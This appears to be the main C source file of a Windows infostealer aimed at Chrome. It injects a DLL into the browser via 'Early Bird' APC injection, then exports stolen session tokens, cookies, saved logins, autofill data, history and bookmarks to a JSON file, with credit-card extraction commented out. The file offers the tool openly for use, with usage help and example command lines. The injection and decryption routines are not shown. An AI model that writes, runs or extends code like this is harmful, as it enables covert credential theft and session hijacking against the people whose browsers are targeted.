#include "Headers.h"



static VOID PrintUsage(IN LPCSTR pszExeName)
{
    printf("Usage: %s [options]\n\n", pszExeName);
    printf("Options:\n");
    printf("  /o <file>    Output JSON File (default: %s)\n", DEFAULT_OUTPUT_FILE);
    printf("  /all         Export All Entries (default: max %d per category)\n", MAX_DISPLAY_COUNT);
    printf("  /?           Show This Help Message\n\n");
    printf("Examples:\n");
    printf("  %s                        Extract %d Entry To %s\n", pszExeName, MAX_DISPLAY_COUNT, DEFAULT_OUTPUT_FILE);
    printf("  %s /all                   Export All Entries\n", pszExeName);
    printf("  %s /o Output.json /all    Extract All To Output.json\n\n", pszExeName);
}



int main(int argc, char* argv[])
{
    CHROME_DATA     ChromeData          = { 0 };
    INT             nResult             = -1;
    BOOL            bShowAll            = FALSE;
    LPCSTR          pszOutputFile       = DEFAULT_OUTPUT_FILE;

    for (int i = 1; i < argc; i++)
    {
        if (lstrcmpiA(argv[i], "/?") == 0 || lstrcmpiA(argv[i], "-?") == 0 || lstrcmpiA(argv[i], "/h") == 0 || lstrcmpiA(argv[i], "-h") == 0)
        {
            PrintUsage(PathFindFileNameA(argv[0]));
            return 0;
        }
        else if (lstrcmpiA(argv[i], "/all") == 0 || lstrcmpiA(argv[i], "-all") == 0)
        {
            bShowAll = TRUE;
        }
        else if (lstrcmpiA(argv[i], "/o") == 0 || lstrcmpiA(argv[i], "-o") == 0)
        {
            if (i + 1 < argc)
            {
                pszOutputFile = argv[++i];
            }
            else
            {
                printf("[!] Error: '/o' Requires A Filename\n\n");
                PrintUsage(argv[0]);
                return -1;
            }
        }
        else
        {
            printf("[!] Unknown Argument: '%s'\n\n", argv[i]);
            PrintUsage(PathFindFileNameA(argv[0]));
            return -1;
        }
    }

    if (!InjectDllViaEarlyBird(&ChromeData))
        goto _END_OF_FUNC;

#define PRINT_COUNT(label, count) \
    bShowAll ? printf("[i] " label "%lu\n", count) : printf("[i] " label "%lu/%lu\n", min(count, MAX_DISPLAY_COUNT), count)

    printf("[+] Extraction Complete!\n");
    PRINT_COUNT("Tokens:         ", ChromeData.dwTokenCount);
    PRINT_COUNT("Cookies:        ", ChromeData.dwCookieCount);
    PRINT_COUNT("Logins:         ", ChromeData.dwLoginCount);
    //PRINT_COUNT("Credit Cards:   ", ChromeData.dwCreditCardCount);
    PRINT_COUNT("Autofill:       ", ChromeData.dwAutofillCount);
    PRINT_COUNT("History:        ", ChromeData.dwHistoryCount);
    PRINT_COUNT("Bookmarks:      ", ChromeData.dwBookmarkCount);
    printf("\n");

#undef PRINT_COUNT

    if (!WriteChromeDataToJson(&ChromeData, pszOutputFile, bShowAll))
    {
        printf("[!] Failed to Write The JSON File\n");
        goto _END_OF_FUNC;
    }

    printf("[+] Extracted Data Is Written To: %s\n", pszOutputFile);
    printf("[*] Bye!\n");

    nResult = 0;

_END_OF_FUNC:
    FreeChromeData(&ChromeData);
    return nResult;
}